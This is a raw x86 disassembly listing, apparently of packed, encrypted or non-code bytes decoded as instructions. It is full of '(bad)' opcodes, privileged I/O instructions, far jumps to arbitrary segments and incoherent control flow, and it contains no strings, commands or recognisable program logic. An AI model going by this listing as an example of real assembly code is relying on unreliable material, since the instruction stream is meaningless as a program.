  43ae0a:	fsub   DWORD PTR [eax-0x62feedad]
  43ae10:	loop   0x43ae51
  43ae12:	or     al,0xe1
  43ae14:	test   ebp,0x408e9fee
  43ae1a:	mov    ch,BYTE PTR [ebx]
  43ae1c:	sub    eax,0x82bf2e18
  43ae21:	sub    DWORD PTR [ebp-0x5f],edx
  43ae24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ae25:	es ret 0xe27
  43ae29:	inc    ebx
  43ae2a:	out    dx,al
  43ae2b:	out    0x67,eax
  43ae2d:	cli    
  43ae2e:	gs mov esi,0xa19eeed7
  43ae34:	mov    eax,0x69f05a9
  43ae39:	les    ecx,FWORD PTR [ecx]
  43ae3b:	pop    ss
  43ae3c:	pop    esi
  43ae3d:	and    BYTE PTR fs:[ebp-0x60],bl
  43ae41:	mov    bh,0xcb
  43ae43:	dec    esi
  43ae44:	mov    ds:0xf7f6b660,eax
  43ae49:	xchg   al,al
  43ae4b:	stc    
  43ae4c:	je     0x43ae17
  43ae4e:	out    dx,al
  43ae4f:	mov    DWORD PTR [edx-0x65],ecx
  43ae52:	jmp    FWORD PTR [esi-0x505f6ad9]
  43ae58:	es mov bl,0xed
  43ae5b:	cmp    al,0x5a
  43ae5d:	and    BYTE PTR [edi+0x68314d37],dl
  43ae63:	adc    BYTE PTR [esi+0x3e],bl
  43ae66:	loope  0x43ae1e
  43ae68:	mov    ?,WORD PTR [edi]
  43ae6a:	add    BYTE PTR [esi+0x79265993],bl
  43ae70:	dec    ebx
  43ae71:	or     esp,esp
  43ae73:	cmp    edx,ebx
  43ae75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ae76:	(bad)  [eax+0x22]
  43ae79:	out    dx,al
  43ae7a:	xchg   esi,eax
  43ae7b:	das    
  43ae7c:	jmp    0x43ae9c
  43ae7e:	out    dx,al
  43ae7f:	inc    edi
  43ae80:	jno    0x43ae95
  43ae82:	xchg   ebx,eax
  43ae83:	loop   0x43ae6e
  43ae85:	jo     0x43ae61
  43ae87:	mov    al,ds:0xca7c9616
  43ae8c:	jbe    0x43aeb6
  43ae8e:	sbb    esp,ebp
  43ae90:	dec    edx
  43ae91:	push   cs
  43ae92:	mov    eax,0xca668799
  43ae97:	and    BYTE PTR ds:0x49e0366,bh
  43ae9d:	sahf   
  43ae9e:	xchg   DWORD PTR [eax-0x32b73c2a],ebp
  43aea4:	pop    ss
  43aea5:	add    edx,ebx
  43aea7:	sbb    esi,DWORD PTR [ecx+esi*8-0x21]
  43aeab:	jo     0x43af0b
  43aead:	scas   eax,DWORD PTR es:[edi]
  43aeae:	cmp    BYTE PTR [esp+edx*4],0xea
  43aeb2:	mov    dl,0xa2
  43aeb4:	adc    ah,BYTE PTR [ecx+0x64]
  43aeb7:	xor    DWORD PTR [esp+eiz*2-0x15ffd9a0],ecx
  43aebe:	out    dx,al
  43aebf:	fsubrp st(7),st
  43aec1:	enter  0x2d18,0x1
  43aec5:	mov    bl,0xc7
  43aec7:	mov    al,ds:0x42f09494
  43aecc:	xor    ecx,DWORD PTR [ebp+0x295e27c1]
  43aed2:	stc    
  43aed3:	aas    
  43aed4:	mov    eax,0x197952af
  43aed9:	mov    edi,0xde73a0b1
  43aede:	push   ds
  43aedf:	xor    BYTE PTR [ebx],bl
  43aee1:	es js  0x43af3f
  43aee4:	pop    esi
  43aee5:	outs   dx,BYTE PTR ds:[esi]
  43aee6:	std    
  43aee7:	push   cs
  43aee8:	enter  0x376,0xb3
  43aeec:	mov    esp,0x7e13ba55
  43aef1:	pop    ebp
  43aef2:	out    dx,al
  43aef3:	inc    esp
  43aef4:	and    dl,BYTE PTR [esi-0x72a1f227]
  43aefa:	add    eax,0xe0e5486c
  43aeff:	nop
  43af00:	and    al,0x45
  43af02:	push   edx
  43af03:	mov    ch,0xd8
  43af05:	sbb    eax,0xbbcd75c0
  43af0a:	dec    esi
  43af0b:	mov    esp,0xcbe962c5
  43af10:	sbb    dl,BYTE PTR [eax]
  43af12:	push   0x4
  43af14:	fmulp  st(5),st
  43af16:	sub    DWORD PTR [eax],ebp
  43af18:	ja     0x43af96
  43af1a:	fistp  DWORD PTR [ecx]
  43af1c:	jp     0x43af7e
  43af1e:	xor    BYTE PTR [edi-0x52],bh
  43af21:	jmp    0x59a27d37
  43af26:	dec    edx
  43af27:	daa    
  43af28:	jb     0x43af8f
  43af2a:	fldcw  WORD PTR [eax-0x50]
  43af2d:	pusha  
  43af2e:	out    0x43,eax
  43af30:	lahf   
  43af31:	fisubr WORD PTR [edx]
  43af33:	add    al,0x32
  43af35:	inc    esp
  43af36:	out    dx,al
  43af37:	mov    al,0x36
  43af39:	inc    edi
  43af3a:	or     DWORD PTR [ecx-0x19],edx
  43af3d:	add    eax,0x757ba18f
  43af42:	daa    
  43af43:	sbb    cl,BYTE PTR [ecx]
  43af45:	mov    bh,0x96
  43af47:	icebp  
  43af48:	push   ecx
  43af49:	cli    
  43af4a:	inc    ebx
  43af4b:	push   es
  43af4c:	push   ds
  43af4d:	aas    
  43af4e:	xchg   edx,eax
  43af4f:	fisubr WORD PTR [edx]
  43af51:	adc    bh,ah
  43af53:	mov    al,ds:0xc2652d86
  43af58:	das    
  43af59:	sub    edx,ecx
  43af5b:	mov    ebx,0x88ee7c80
  43af60:	jns    0x43af90
  43af62:	cmp    al,0x64
  43af64:	rol    bh,cl
  43af66:	in     eax,0x8e
  43af68:	fxch   st(4)
  43af6a:	push   0x61
  43af6c:	aaa    
  43af6d:	dec    edi
  43af6e:	adc    esp,eax
  43af70:	repz push cs
  43af72:	out    dx,al
  43af73:	jge    0x43afa7
  43af75:	mov    edi,0xe8e1fd77
  43af7a:	ret    0xeea0
  43af7d:	mov    esp,0x7ef4cdff
  43af82:	fbstp  TBYTE PTR [esi+ebx*2-0x747ff5d2]
  43af89:	loop   0x43afe7
  43af8b:	mov    ecx,0xa080710d
  43af90:	call   0x91d2:0x633bc20c
  43af97:	adc    al,bh
  43af99:	loopne 0x43afb4
  43af9b:	pushf  
  43af9c:	pushf  
  43af9d:	scas   eax,DWORD PTR es:[edi]
  43af9e:	or     eax,0xb9e942a1
  43afa3:	into   
  43afa4:	add    ebx,DWORD PTR [ebp+ecx*4-0x562a144]
  43afab:	xor    esi,0xffffffa5
  43afae:	inc    esp
  43afaf:	and    eax,0x7aef614c
  43afb4:	adc    eax,0x34ffbaec
  43afb9:	cmp    al,0x23
  43afbb:	call   0x10f:0x192659a1
  43afc2:	aas    
  43afc3:	cwde   
  43afc4:	cdq    
  43afc5:	mov    ebp,0xe745a2eb
  43afca:	ja     0x43afdc
  43afcc:	jnp    0x43afa7
  43afce:	dec    esi
  43afcf:	cmp    eax,0xefecbaf7
  43afd4:	clc    
  43afd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43afd6:	xor    al,0xc9
  43afd8:	push   ebx
  43afd9:	inc    ecx
  43afda:	fadd   DWORD PTR [ecx]
  43afdc:	cmp    eax,0x79a10bbd
  43afe1:	or     DWORD PTR [edx+0x3069df00],esi
  43afe7:	mov    bh,BYTE PTR [esi+edi*4]
  43afea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afeb:	mov    ah,0x34
  43afed:	popa   
  43afee:	mov    esp,0x2b55e6e3
  43aff3:	inc    ebp
  43aff4:	jnp    0x43b056
  43aff6:	iret   
  43aff7:	lea    esp,[ebx]
  43aff9:	in     al,dx
  43affa:	push   esi
  43affb:	sub    al,0xc2
  43affd:	fdivr  st(2),st
  43afff:	cs nop
  43b001:	dec    esp
  43b002:	push   ss
  43b003:	cmp    eax,DWORD PTR [edi]
  43b005:	popa   
  43b006:	mov    ch,0xf2
  43b008:	xlat   BYTE PTR ds:[ebx]
  43b009:	and    ebx,DWORD PTR [edx-0x35]
  43b00c:	popf   
  43b00d:	push   ss
  43b00e:	out    dx,al
  43b00f:	push   esi
  43b010:	xchg   esi,eax
  43b011:	rcr    BYTE PTR [ebp+0x2c4fb379],cl
  43b017:	lds    ebx,FWORD PTR [ebx+0x5a0a953]
  43b01d:	jo     0x43b047
  43b01f:	xor    al,0xb9
  43b021:	add    eax,0x2fd8a8ee
  43b026:	dec    edx
  43b027:	into   
  43b028:	aas    
  43b029:	mov    al,ds:0xd176a0fd
  43b02e:	sbb    esi,DWORD PTR [edx+ebp*2+0x26]
  43b032:	fmul   st(6),st
  43b034:	pop    ebp
  43b035:	jmp    0x1934:0x4595fed2
  43b03c:	ficom  WORD PTR [edi+eiz*1-0x2a]
  43b040:	dec    ecx
  43b041:	out    0x2d,eax
  43b043:	divps  xmm3,XMMWORD PTR [edi]
  43b046:	jae    0x43b04f
  43b048:	cmp    eax,0x93d1f6fb
  43b04d:	je     0x43b085
  43b04f:	push   cs
  43b050:	pop    ecx
  43b051:	bound  ebp,QWORD PTR [esi+0x1a]
  43b054:	inc    ecx
  43b055:	not    BYTE PTR [esi-0x11b7c047]
  43b05b:	or     al,0xc8
  43b05e:	out    0xb,eax
  43b060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b061:	or     al,0x31
  43b063:	xchg   ebx,eax
  43b064:	retf   0xb126
  43b067:	mov    al,ds:0x79488e55
  43b06c:	mov    ds:0x1642ee6f,al
  43b071:	lods   eax,DWORD PTR ds:[esi]
  43b072:	add    al,0x7b
  43b074:	fld    QWORD PTR [ebx]
  43b076:	xchg   esi,eax
  43b077:	mov    eax,ds:0x1aa1cea3
  43b07c:	mov    esp,0x5e3d7020
  43b081:	test   BYTE PTR [ebx],ch
  43b083:	rcr    BYTE PTR [eax],cl
  43b085:	add    eax,0x60c6c983
  43b08a:	sti    
  43b08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b08c:	xchg   ebp,eax
  43b08d:	(bad)  
  43b08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b08f:	mov    ecx,ebp
  43b091:	fs out 0x17,eax
  43b094:	add    DWORD PTR [ebx],esi
  43b096:	cmp    esi,DWORD PTR [edx+0x6232dd6e]
  43b09c:	fwait
  43b09d:	pop    edi
  43b09e:	pop    ecx
  43b09f:	popf   
  43b0a0:	adc    al,0x7a
  43b0a2:	mov    bl,0x7d
  43b0a4:	cwd    
  43b0a6:	sbb    DWORD PTR [esi+0x1ac60c5e],0xf69e35f6
  43b0b0:	jl     0x43b112
  43b0b2:	pop    esi
  43b0b3:	cmp    BYTE PTR [ecx+ebx*8-0xc],cl
  43b0b7:	clc    
  43b0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b0b9:	enter  0x42ee,0xaf
  43b0bd:	aad    0xac
  43b0bf:	mov    ecx,0xaa6c08c4
  43b0c4:	cld    
  43b0c5:	call   0xa9d5:0xbb81526e
  43b0cc:	fadd   DWORD PTR [esi]
  43b0ce:	out    dx,al
  43b0cf:	jo     0x43b05a
  43b0d1:	sub    edx,ebp
  43b0d3:	push   0xffffff8e
  43b0d5:	mov    eax,0x7cb7a0c2
  43b0da:	add    BYTE PTR [ebx],dh
  43b0dc:	shl    dl,1
  43b0de:	scas   eax,DWORD PTR es:[edi]
  43b0df:	pop    ds
  43b0e0:	pop    esi
  43b0e1:	xor    al,BYTE PTR [esi]
  43b0e3:	lock fmulp st(0),st
  43b0e6:	cmp    al,0x5c
  43b0e8:	add    al,0x5e
  43b0ea:	and    DWORD PTR ds:0xd5b556b,ebx
  43b0f0:	(bad)  
  43b0f1:	mov    al,0x9
  43b0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b0f4:	push   esp
  43b0f5:	push   0x4e
  43b0f7:	add    al,0xde
  43b0f9:	mov    dl,0x36
  43b0fb:	sbb    edi,esi
  43b0fd:	(bad)  [eax-0x5f]
  43b100:	nop
  43b101:	out    dx,eax
  43b102:	mov    edx,0xf868f70b
  43b107:	jb     0x43b16c
  43b109:	cld    
  43b10a:	inc    ebx
  43b10b:	inc    edi
  43b10c:	and    ah,BYTE PTR [ecx]
  43b10e:	jbe    0x43b09f
  43b110:	inc    esi
  43b111:	mov    al,ds:0x24cba2da
  43b116:	mov    ah,0xc2
  43b118:	cmp    bl,bl
  43b11a:	imul   eax,DWORD PTR [esp+ebp*2+0x44],0x7e
  43b11f:	push   ss
  43b120:	scas   eax,DWORD PTR es:[edi]
  43b121:	popa   
  43b122:	out    dx,al
  43b123:	inc    esp
  43b124:	cmc    
  43b125:	test   DWORD PTR [edx-0x27],eax
  43b128:	push   ecx
  43b129:	or     al,0x3
  43b12b:	mov    eax,ds:0x52b85f1e
  43b130:	mov    ch,BYTE PTR [ecx+0x455d7c87]
  43b136:	fild   DWORD PTR [ecx+0x624fcf7b]
  43b13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b13d:	frstor [ecx+eiz*4]
  43b140:	repz sub al,0xb2
  43b143:	or     DWORD PTR [ecx+0x22],edi
  43b146:	pop    ss
  43b147:	mov    cl,0xee
  43b149:	mov    edx,0x396d3cee
  43b14e:	push   0xd51967d8
  43b153:	mov    al,ds:0x7469bf15
  43b158:	fstp   QWORD PTR [esp+ebp*8+0x4]
  43b15c:	icebp  
  43b15d:	gs out dx,al
  43b15f:	mov    al,0x24
  43b161:	call   0xa103:0x1749c137
  43b168:	cmp    BYTE PTR [ebx+esi*8+0x1c],0xd7
  43b16d:	xchg   edx,eax
  43b16e:	shl    BYTE PTR [ebx-0x7e],1
  43b171:	dec    edx
  43b172:	out    0x8c,eax
  43b174:	pop    esp
  43b175:	stc    
  43b176:	fwait
  43b177:	rcr    DWORD PTR [esi+0x9],0x87
  43b17b:	pop    ss
  43b17c:	scas   al,BYTE PTR es:[edi]
  43b17d:	pop    ecx
  43b17e:	and    ch,BYTE PTR [edi+0x518e63a5]
  43b184:	popa   
  43b185:	pusha  
  43b186:	ins    BYTE PTR es:[edi],dx
  43b187:	ret    0xb85e
  43b18a:	add    esi,DWORD PTR [edx-0x17]
  43b18d:	push   edx
  43b18e:	inc    esi
  43b18f:	mov    cl,BYTE PTR [edi+0x44]
  43b192:	push   edi
  43b193:	jo     0x43b1a3
  43b195:	loope  0x43b1e7
  43b197:	rcl    DWORD PTR ds:0x5346159a,cl
  43b19d:	jo     0x43b1b9
  43b19f:	(bad)  
  43b1a0:	pop    esi
  43b1a1:	(bad)  
  43b1a2:	sbb    ebp,DWORD PTR [edi-0x683e7509]
  43b1a8:	sub    DWORD PTR [ebx],esi
  43b1aa:	xchg   BYTE PTR [ecx-0x39254ec1],ah
  43b1b0:	xor    dh,bh
  43b1b2:	and    eax,0x9ee07019
  43b1b7:	jbe    0x43b19d
  43b1b9:	mov    ebp,0x5efa6065
  43b1be:	cmp    DWORD PTR [edi],0x619a59d7
  43b1c4:	add    BYTE PTR [ebp+0x324de8ae],dl
  43b1ca:	out    0x27,eax
  43b1cc:	jmp    0x43b248
  43b1ce:	sahf   
  43b1cf:	lock pop ds
  43b1d1:	xchg   ecx,eax
  43b1d2:	cmp    eax,0xa610c57
  43b1d7:	test   eax,0x86ebc714
  43b1dc:	mov    ebp,edi
  43b1de:	in     eax,dx
  43b1df:	bound  esi,QWORD PTR [edi-0x6cf67a0e]
  43b1e5:	daa    
  43b1e6:	or     BYTE PTR ss:[edx],cl
  43b1e9:	pop    esi
  43b1ea:	cmp    eax,DWORD PTR [eax-0x33cd8587]
  43b1f0:	xchg   DWORD PTR [esi],edx
  43b1f2:	gs lock pop ecx
  43b1f5:	mov    ch,0x16
  43b1f7:	dec    esp
  43b1f8:	lock popf 
  43b1fa:	out    dx,al
  43b1fb:	js     0x43b181
  43b1fd:	int    0x35
  43b1ff:	mov    eax,0xae70013d
  43b204:	push   ecx
  43b205:	push   esp
  43b206:	out    dx,al
  43b207:	repnz int3 
  43b209:	push   ebp
  43b20a:	mov    ecx,0xeea3a9a9
  43b20f:	sahf   
  43b210:	jmp    0xd094:0xf2adf826
  43b217:	mov    al,ds:0x2038b630
  43b21c:	pop    ds
  43b21d:	xchg   edi,eax
  43b21e:	xor    eax,0x182834ee
  43b223:	xor    BYTE PTR [edi-0x20],dh
  43b226:	jnp    0x43b27b
  43b228:	aas    
  43b229:	loop   0x43b28f
  43b22b:	sub    al,0x57
  43b22d:	popa   
  43b22e:	adc    dh,bh
  43b230:	push   0xffffffa0
  43b232:	dec    esi
  43b233:	mov    al,0xc9
  43b235:	xchg   dh,ch
  43b237:	pop    esi
  43b238:	jl     0x43b1f9
  43b23a:	sbb    BYTE PTR [esi-0x50],ch
  43b23d:	mov    bh,0xc8
  43b23f:	mov    eax,ds:0x2675f0b4
  43b244:	push   cs
  43b245:	add    eax,0xbc5b6d77
  43b24a:	out    0xdc,eax
  43b24c:	xchg   ebx,eax
  43b24d:	jmp    0x43b20f
  43b24f:	mov    dl,0x6e
  43b251:	or     dh,BYTE PTR [edx+0x6c]
  43b254:	mov    esp,0x94db4b42
  43b259:	loope  0x43b2c6
  43b25b:	dec    ecx
  43b25c:	jle    0x43b1e8
  43b25e:	ja     0x43b256
  43b260:	shl    BYTE PTR [esi-0x32],0x49
  43b264:	arpl   WORD PTR [ebx],di
  43b266:	out    dx,al
  43b267:	jnp    0x43b268
  43b269:	push   esp
  43b26a:	mov    gs,esp
  43b26c:	lea    ecx,[ebp+0x730fa415]
  43b272:	or     ebx,eax
  43b274:	dec    eax
  43b275:	retf   
  43b276:	push   ebx
  43b277:	inc    ebp
  43b278:	fidiv  WORD PTR [ecx]
  43b27a:	ds cs pop esi
  43b27d:	mov    esi,0xec4b2803
  43b282:	popf   
  43b283:	inc    eax
  43b284:	ret    0x6860
  43b287:	test   DWORD PTR [ebx-0x609f84f0],ecx
  43b28d:	push   ebp
  43b28e:	add    al,BYTE PTR [esi]
  43b290:	pop    esp
  43b291:	jge    0x43b301
  43b293:	adc    bh,BYTE PTR [edx-0x21d76afc]
  43b299:	pop    ecx
  43b29a:	enter  0x1a8c,0xf6
  43b29e:	jg     0x43b2b1
  43b2a0:	pop    es
  43b2a1:	sbb    al,al
  43b2a3:	dec    ecx
  43b2a4:	fs stos DWORD PTR es:[edi],eax
  43b2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b2a7:	xchg   edx,eax
  43b2a8:	shr    DWORD PTR [bp+di],0x3e
  43b2ac:	add    al,bl
  43b2ae:	shl    BYTE PTR [eax+0x6ecd0b62],1
  43b2b4:	mov    esp,DWORD PTR [edi+edi*4]
  43b2b7:	rcr    BYTE PTR [esi+0x3c],0xf6
  43b2bb:	dec    ebp
  43b2bc:	add    esi,eax
  43b2be:	or     ebp,esi
  43b2c0:	adc    BYTE PTR [eax+0x40],ah
  43b2c3:	ret    
  43b2c4:	sahf   
  43b2c5:	pop    ss
  43b2c6:	push   esp
  43b2c7:	cmp    BYTE PTR ss:[edi+esi*2+0x3f5f5e72],0xfd
  43b2d0:	xchg   edx,eax
  43b2d1:	out    dx,al
  43b2d2:	mov    eax,0xc8520f75
  43b2d7:	inc    esp
  43b2d8:	fdivr  DWORD PTR [eax]
  43b2da:	cs inc eax
  43b2dc:	lods   al,BYTE PTR ds:[esi]
  43b2dd:	xchg   DWORD PTR [ebp-0x11c3153c],esp
  43b2e3:	sub    eax,0x8966290d
  43b2e8:	pop    ds
  43b2e9:	mov    db4,ebp
  43b2ec:	add    edx,DWORD PTR [ebp-0x5f2dc817]
  43b2f2:	pop    es
  43b2f3:	pushf  
  43b2f4:	jne    0x43b325
  43b2f6:	jmp    0x43b32a
  43b2f8:	out    dx,al
  43b2f9:	mov    al,ds:0xa0b38292
  43b2fe:	sahf   
  43b2ff:	loope  0x43b293
  43b301:	push   edx
  43b302:	push   ecx
  43b303:	sahf   
  43b304:	add    BYTE PTR [eax-0x7c9c4ff2],ah
  43b30a:	aas    
  43b30b:	cmp    BYTE PTR [esi-0x71],bl
  43b30e:	into   
  43b30f:	fcmove st,st(5)
  43b311:	mov    edx,0x6109320f
  43b316:	dec    edx
  43b317:	inc    eax
  43b318:	cli    
  43b319:	pop    edi
  43b31a:	je     0x43b39a
  43b31c:	icebp  
  43b31d:	repnz out dx,al
  43b31f:	push   ecx
  43b320:	and    al,0x88
  43b322:	jl     0x43b30f
  43b324:	mov    al,ds:0x9df05be7
  43b329:	pusha  
  43b32a:	or     DWORD PTR [ecx-0x6541468e],esi
  43b330:	into   
  43b331:	pop    ds
  43b332:	push   esi
  43b333:	push   cs
  43b334:	pop    esi
  43b335:	nop
  43b336:	retf   
  43b337:	sub    esi,esp
  43b339:	sub    DWORD PTR [eax],ebx
  43b33b:	icebp  
  43b33c:	(bad)  
  43b33d:	pusha  
  43b33e:	das    
  43b33f:	jl     0x43b396
  43b341:	je     0x43b35a
  43b343:	pop    eax
  43b344:	or     BYTE PTR [edi+esi*8+0x21],bh
  43b348:	or     BYTE PTR [eax-0x12],0x32
  43b34c:	fcmovnu st,st(2)
  43b34e:	imul   edx,DWORD PTR [ebx],0xffffff86
  43b351:	pop    edi
  43b352:	ja     0x43b30e
  43b354:	dec    ecx
  43b355:	cwde   
  43b356:	xlat   BYTE PTR ds:[ebx]
  43b357:	jle    0x43b31b
  43b359:	test   al,0x1b
  43b35b:	push   esp
  43b35c:	pusha  
  43b35d:	push   cs
  43b35e:	retf   0xd530
  43b361:	push   ds
  43b362:	mov    dl,0xcd
  43b364:	lahf   
  43b365:	lea    esp,[edi+0x21]
  43b368:	dec    edi
  43b369:	sub    cl,bh
  43b36b:	sub    eax,0x7c84125e
  43b370:	sub    cl,BYTE PTR [esi]
  43b372:	repz mov dl,0xdc
  43b375:	pusha  
  43b376:	jns    0x43b3cf
  43b378:	(bad)  
  43b379:	push   cs
  43b37a:	pcmpgtb mm0,QWORD PTR [ebp-0x7d]
  43b37e:	out    dx,al
  43b37f:	pop    eax
  43b380:	and    ch,BYTE PTR [eax+0x58a2bd6]
  43b386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b387:	mov    al,ds:0x49e612d7
  43b38c:	xchg   ecx,eax
  43b38d:	xor    al,0x4
  43b38f:	pop    edx
  43b390:	pop    ecx
  43b391:	pop    ebx
  43b392:	jmp    0x56cf:0x6e0f1d53
  43b399:	rcr    dh,cl
  43b39b:	ins    BYTE PTR es:[edi],dx
  43b39c:	jb     0x43b3fe
  43b39e:	or     DWORD PTR [ebx+esi*8],edx
  43b3a1:	fnsave [esp+edx*1-0x420fff29]
  43b3a8:	sbb    BYTE PTR [ebp+0x56],cl
  43b3ab:	mov    bl,0x5e
  43b3ad:	xchg   edx,eax
  43b3ae:	aad    0xd3
  43b3b0:	sbb    BYTE PTR ds:0x2a5fc75d,0x51
  43b3b7:	mov    eax,ds:0x70f5a9b6
  43b3bc:	fnsave [ebx+edi*8+0x1]
  43b3c0:	dec    esi
  43b3c1:	sbb    ebp,esp
  43b3c3:	imul   ebp,DWORD PTR [ebp+eax*4-0x27067f07],0xffffffff
  43b3cb:	repnz clc 
  43b3cd:	pusha  
  43b3ce:	(bad)  
  43b3cf:	mov    ch,0xa0
  43b3d1:	pop    esi
  43b3d2:	sbb    ch,BYTE PTR ds:0x37eeceb3
  43b3d8:	dec    ebx
  43b3d9:	ror    DWORD PTR [edx],1
  43b3db:	mov    ds:0xa12061df,al
  43b3e0:	outs   dx,BYTE PTR ds:[esi]
  43b3e1:	cdq    
  43b3e2:	cwde   
  43b3e3:	mov    dl,0xbe
  43b3e5:	loop   0x43b3b1
  43b3e7:	inc    ecx
  43b3e8:	pop    esi
  43b3e9:	push   ebp
  43b3ea:	xor    DWORD PTR [ebx+0xa],esi
  43b3ed:	retf   
  43b3ee:	lock ins BYTE PTR es:[edi],dx
  43b3f0:	popa   
  43b3f1:	popa   
  43b3f2:	pop    ebp
  43b3f3:	jne    0x43b40f
  43b3f5:	call   0x68cfb691
  43b3fa:	fstp   TBYTE PTR [ebx]
  43b3fc:	pop    ebp
  43b3fd:	xchg   esp,eax
  43b3fe:	dec    edx
  43b3ff:	jle    0x43b468
  43b401:	mov    dh,0xa
  43b403:	pop    esp
  43b404:	mov    es,WORD PTR [eax]
  43b406:	clc    
  43b407:	mov    al,ds:0xecf9d719
  43b40c:	add    eax,DWORD PTR [ecx+0x38]
  43b40f:	xchg   esp,eax
  43b410:	pop    edi
  43b411:	dec    ebp
  43b412:	in     al,dx
  43b413:	nop
  43b414:	jmp    0x66c5:0xaf413a5f
  43b41b:	nop
  43b41c:	and    al,ch
  43b41e:	cwde   
  43b41f:	popa   
  43b420:	xor    dl,0x5
  43b423:	rol    edi,0x59
  43b426:	pop    edx
  43b427:	pop    ss
  43b428:	pop    ebx
  43b429:	dec    edx
  43b42a:	loopne 0x43b490
  43b42c:	sbb    BYTE PTR [edx],dh
  43b42e:	cs js  0x43b3bd
  43b431:	std    
  43b432:	xchg   esp,eax
  43b433:	imul   esp,DWORD PTR [edx+0x61],0x7bc38b8d
  43b43a:	jo     0x43b3fc
  43b43c:	inc    esp
  43b43d:	xchg   ebx,eax
  43b43e:	out    0x2a,eax
  43b440:	adc    eax,0xa0d0f450
  43b445:	or     al,0x6b
  43b447:	popa   
  43b448:	and    al,0x3f
  43b44a:	stos   BYTE PTR es:[edi],al
  43b44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b44c:	sub    eax,0x5388ddb6
  43b451:	mov    cl,0x68
  43b453:	adc    DWORD PTR [ebx+0x1e12ee86],eax
  43b459:	jg     0x43b4cc
  43b45b:	adc    DWORD PTR [ebx+0x32a0f5b8],0xb442d8fd
  43b465:	push   esp
  43b466:	sbb    al,0x63
  43b468:	pop    esi
  43b469:	xor    eax,0xc1a64208
  43b46e:	push   ebp
  43b46f:	cmp    eax,0x3640613b
  43b474:	lahf   
  43b475:	aaa    
  43b476:	jo     0x43b3fb
  43b478:	out    0x4f,eax
  43b47a:	out    dx,al
  43b47b:	test   BYTE PTR [ebx+0x7321125d],bl
  43b481:	xchg   edi,eax
  43b482:	dec    ecx
  43b483:	pushf  
  43b484:	and    BYTE PTR [eax-0x1a],al
  43b487:	dec    ebx
  43b488:	or     esp,ecx
  43b48a:	enter  0x3c21,0xe9
  43b48e:	hlt    
  43b48f:	mov    fs,WORD PTR [ebp+edx*8+0x55]
  43b493:	and    DWORD PTR [esi+0x51],edi
  43b496:	xchg   esp,eax
  43b497:	push   ebp
  43b498:	cld    
  43b499:	jae    0x43b49d
  43b49b:	imul   ecx,DWORD PTR [edx],0x36732ebe
  43b4a1:	pushf  
  43b4a2:	rcl    dh,cl
  43b4a4:	aas    
  43b4a5:	popa   
  43b4a6:	and    al,BYTE PTR [edi-0x1b]
  43b4a9:	pop    ecx
  43b4aa:	fild   QWORD PTR [ecx-0xe122ee6]
  43b4b0:	stos   BYTE PTR es:[edi],al
  43b4b1:	ins    DWORD PTR es:[edi],dx
  43b4b2:	(bad)  
  43b4b3:	mov    ds:0x42365570,al
  43b4b8:	pop    ebp
  43b4b9:	das    
  43b4ba:	xchg   ecx,eax
  43b4bb:	scas   eax,DWORD PTR es:[edi]
  43b4bc:	inc    esp
  43b4bd:	xchg   DWORD PTR [ecx+0x723db2e],esp
  43b4c3:	dec    esp
  43b4c4:	(bad)  
  43b4c5:	lock sbb eax,0xee354218
  43b4cb:	in     al,0xb0
  43b4cd:	or     BYTE PTR [edx-0x50],0xc7
  43b4d1:	hlt    
  43b4d2:	sub    edx,DWORD PTR [ebx-0x5f33d0e8]
  43b4d8:	pop    edi
  43b4d9:	inc    edi
  43b4da:	repnz and BYTE PTR [ecx-0x5d9e11ca],dl
  43b4e1:	je     0x43b505
  43b4e3:	sbb    bh,BYTE PTR [edi-0x3c]
  43b4e6:	bound  ebp,QWORD PTR [eax-0x50eb6373]
  43b4ec:	sub    eax,0x7e4546cf
  43b4f1:	aaa    
  43b4f2:	sti    
  43b4f3:	dec    edx
  43b4f4:	(bad)  
  43b4f5:	loopne 0x43b555
  43b4f7:	lds    eax,FWORD PTR [esi]
  43b4f9:	add    DWORD PTR [edi],ecx
  43b4fb:	int    0xe7
  43b4fd:	or     ch,dh
  43b4ff:	enter  0x95aa,0x1b
  43b503:	pop    ebx
  43b504:	pop    ebp
  43b505:	push   ss
  43b506:	dec    eax
  43b507:	inc    eax
  43b508:	pop    esi
  43b509:	test   BYTE PTR ds:[ecx-0x71],bh
  43b50d:	xor    dl,BYTE PTR [eax]
  43b50f:	cmp    BYTE PTR [edi],bl
  43b511:	pop    esp
  43b512:	stos   BYTE PTR es:[edi],al
  43b513:	ss popa 
  43b515:	test   al,0xa0
  43b517:	popa   
  43b518:	push   ecx
  43b519:	mov    bh,0x70
  43b51b:	retf   
  43b51c:	pop    esi
  43b51d:	xchg   esi,eax
  43b51e:	call   0x72a896ce
  43b523:	and    eax,0x84d55e65
  43b528:	out    dx,eax
  43b529:	cmp    eax,0x1a866e0b
  43b52e:	sub    BYTE PTR [edx+0x3d05e65e],bh
  43b534:	adc    dl,BYTE PTR [ebp+0x60c559c1]
  43b53a:	loop   0x43b539
  43b53c:	xor    ah,BYTE PTR [eax*2+0x509d3498]
  43b543:	push   0x5e
  43b545:	or     al,0x5a
  43b547:	test   bl,dh
  43b549:	mov    bl,0xcd
  43b54b:	inc    edx
  43b54c:	xor    esp,DWORD PTR [ecx-0x40]
  43b54f:	and    al,0xdf
  43b551:	mov    eax,ds:0x107a2937
  43b556:	jmp    0x43b511
  43b558:	mov    cl,BYTE PTR [ebp-0x24]
  43b55b:	dec    edx
  43b55c:	(bad)
  43b560:	sub    al,0x61
  43b562:	push   edx
  43b563:	mov    ebp,0xd8db1281
  43b568:	out    dx,al
  43b569:	add    ebp,esi
  43b56b:	mov    DWORD PTR [edx+esi*1],eax
  43b56e:	popf   
  43b56f:	jne    0x43b50d
  43b571:	dec    ecx
